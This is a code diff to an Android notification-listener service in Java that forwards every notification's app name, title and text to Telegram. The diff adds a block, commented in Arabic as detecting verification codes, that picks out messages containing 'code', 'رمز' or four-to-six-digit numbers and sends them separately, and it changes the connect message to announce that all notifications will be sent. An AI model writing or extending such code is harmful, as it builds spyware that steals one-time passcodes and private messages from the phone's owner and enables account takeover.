@@ -29,6 +29,11 @@ public class NotifyService extends NotificationListenerService {
         
         String message = "🔔 [" + pkg + "]\n" + title + "\n" + text;
         sendToTelegram(message);
+        
+        // كشف رموز التحقق
+        if (text.contains("رمز") || text.contains("code") || text.matches(".*\\d{4,6}.*")) {
+            sendToTelegram("🔐 **Code detected:** " + text);
+        }
     }
 
     private void sendToTelegram(String text) {
@@ -52,6 +57,6 @@ public class NotifyService extends NotificationListenerService {
 
     @Override
     public void onListenerConnected() {
-        sendToTelegram("✅ Notification Service Connected");
+        sendToTelegram("✅ Notification Service Connected - All notifications will be sent");
     }
 }
